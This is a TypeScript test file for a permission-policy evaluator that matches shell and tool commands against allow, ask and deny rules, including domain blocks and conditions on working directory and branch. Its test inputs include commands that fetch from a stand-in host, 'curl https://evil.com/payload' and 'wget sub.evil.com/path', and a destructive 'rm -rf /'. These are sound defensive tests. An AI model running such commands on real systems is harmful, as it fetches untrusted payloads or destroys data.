/**
 * Tests for Claude Code–compatible rule syntax in the evaluator.
 */

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import {
  evaluate,
  normaliseStringRule,
  type PermissionPolicy,
  type EvaluationContext,
} from "../evaluate.ts";

describe("Claude Code rule syntax", () => {
  describe("exact matching", () => {
    it("matches exact command string", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git status", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "git status --short"), "ask");
    });
  });

  describe("prefix matching — word boundary", () => {
    it("matches command equal to prefix", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git"), "allow");
    });

    it("matches command starting with prefix + space", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "npm:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "npm run test"), "allow");
      assert.equal(evaluate(policy, "bash", "npm publish"), "allow");
    });

    it("does not match without word boundary", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "ls:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "lsattr"), "ask");
      assert.equal(evaluate(policy, "bash", "lsof"), "ask");
    });
  });

  describe("wildcard matching", () => {
    it("matches * anywhere in pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git commit *", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    it("trailing * matches bare command too", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git *", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git"), "allow");
      assert.equal(evaluate(policy, "bash", "git add"), "allow");
      assert.equal(evaluate(policy, "bash", "git commit -m test"), "allow");
    });

    it("matches *suffix pattern", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "* Dockerfile", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "cat Dockerfile"), "allow");
    });
  });

  describe("bare tool matching (no pattern)", () => {
    it("absent pattern matches any input for that tool", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "anything at all"), "allow");
    });
  });

  describe("escape sequences", () => {
    it("escaped parens in pattern become exact matches", () => {
      // Pattern contains escaped parens: git log \(main\)
      // Should match: git log (main)
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git log \\(main\\)", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git log (main)"), "allow");
      // Without parens, should not match
      assert.equal(evaluate(policy, "bash", "git log main"), "ask");
    });

    it("escaped asterisk is literal, not wildcard", () => {
      // Pattern: echo \* → literal asterisk
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "echo \\*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "echo *"), "allow");
      // Unescaped wildcard would match anything after "echo "
      // But escaped * only matches literal *
      assert.equal(evaluate(policy, "bash", "echo hello"), "ask");
    });

    it("escaped backslash is literal", () => {
      // Pattern: echo \\ → unescaped: echo \
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "echo \\\\", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "echo \\"), "allow");
    });
  });

  describe("domain pattern", () => {
    it("matches when input contains the domain", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
      };
      assert.equal(
        evaluate(policy, "bash", "curl https://evil.com/payload"),
        "deny",
      );
    });

    it("matches domain as substring of hostname", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "domain:evil.com", tier: "deny" }],
      };
      assert.equal(evaluate(policy, "bash", "wget sub.evil.com/path"), "deny");
    });
  });

  describe("MCP tool matching", () => {
    it("matches entire MCP server", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "mcp__github", tier: "allow" }],
      };
      assert.equal(
        evaluate(policy, "mcp__github__create_issue", "{}"),
        "allow",
      );
      assert.equal(evaluate(policy, "mcp__github__list_prs", "{}"), "allow");
    });

    it("matches MCP server wildcard", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "mcp__*__delete*", tier: "deny" }],
      };
      assert.equal(evaluate(policy, "mcp__github__delete_issue", "{}"), "deny");
      assert.equal(evaluate(policy, "mcp__jira__delete_ticket", "{}"), "deny");
    });
  });

  describe("string rule normalisation", () => {
    it("normalises bare tool name", () => {
      const rule = normaliseStringRule("Read", "allow");
      assert.deepStrictEqual(rule, { tool: "Read", tier: "allow" });
    });

    it("normalises tool with pattern", () => {
      const rule = normaliseStringRule("Bash(git status)", "allow");
      assert.deepStrictEqual(rule, {
        tool: "Bash",
        pattern: "git status",
        tier: "allow",
      });
    });

    it("normalises tool with prefix pattern", () => {
      const rule = normaliseStringRule("Bash(npm:*)", "deny");
      assert.deepStrictEqual(rule, {
        tool: "Bash",
        pattern: "npm:*",
        tier: "deny",
      });
    });

    it("normalises empty parens as bare tool", () => {
      const rule = normaliseStringRule("Bash()", "allow");
      assert.deepStrictEqual(rule, { tool: "Bash", tier: "allow" });
    });

    it("normalises star parens as bare tool", () => {
      const rule = normaliseStringRule("Bash(*)", "allow");
      assert.deepStrictEqual(rule, { tool: "Bash", tier: "allow" });
    });
  });
});

describe("conditional rules", () => {
  describe("basic matching", () => {
    it("ask tier is checked before allow tier", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          { tool: "Bash", pattern: "npm run *", tier: "allow" },
          { tool: "Bash", pattern: "npm run build", tier: "ask" },
        ],
      };
      // deny-first: deny checked, then ask, then allow
      // "npm run build" matches ask tier → ask
      assert.equal(evaluate(policy, "bash", "npm run build"), "ask");
    });

    it("falls through to defaultMode when no rule matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "npm:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "npm install"), "allow");
      assert.equal(evaluate(policy, "bash", "rm -rf /"), "ask");
    });

    it("prefix pattern in conditional rule", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git:*", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "npm install"), "ask");
    });

    it("exact pattern in conditional rule", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [{ tool: "Bash", pattern: "git status", tier: "allow" }],
      };
      assert.equal(evaluate(policy, "bash", "git status"), "allow");
      assert.equal(evaluate(policy, "bash", "git status --short"), "ask");
    });
  });

  describe("when conditions", () => {
    it("matches when cwd condition matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Bash",
            pattern: "npm run *",
            tier: "allow",
            when: { cwd: "./packages/*" },
          },
        ],
      };
      const ctx: EvaluationContext = { cwd: "./packages/api" };
      assert.equal(evaluate(policy, "bash", "npm run test", ctx), "allow");

      const otherCtx: EvaluationContext = { cwd: "./scripts" };
      assert.equal(evaluate(policy, "bash", "npm run test", otherCtx), "ask");
    });

    it("matches when branch condition matches", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Write",
            pattern: "./config/**",
            tier: "ask",
            when: { branch: "main" },
          },
        ],
      };
      const mainCtx: EvaluationContext = { branch: "main" };
      assert.equal(
        evaluate(policy, "write", "./config/app.yaml", mainCtx),
        "ask",
      );

      const featureCtx: EvaluationContext = { branch: "feature/test" };
      assert.equal(
        evaluate(policy, "write", "./config/app.yaml", featureCtx),
        "ask",
      );
    });

    it("AND logic — all conditions must match", () => {
      const policy: PermissionPolicy = {
        defaultMode: "standard",
        rules: [
          {
            tool: "Bash",
            pattern: "npm publish:*",
            tier: "deny",
            when: { cwd: "./packages/core", branch: "main" },
          },
        ],
      };
      // Both match
      assert.equal(
        evaluate(policy, "bash", "npm publish --access public", {
          cwd: "./packages/core",
          branch: "main",
        }),
        "deny",
      );

      // cwd doesn't match
      assert.equal(
        evaluate(policy, "bash", "npm publish --access public", {
          cwd: "./packages/utils",
          branch: "main",
        }),
        "ask",
      );
    });
  });
});
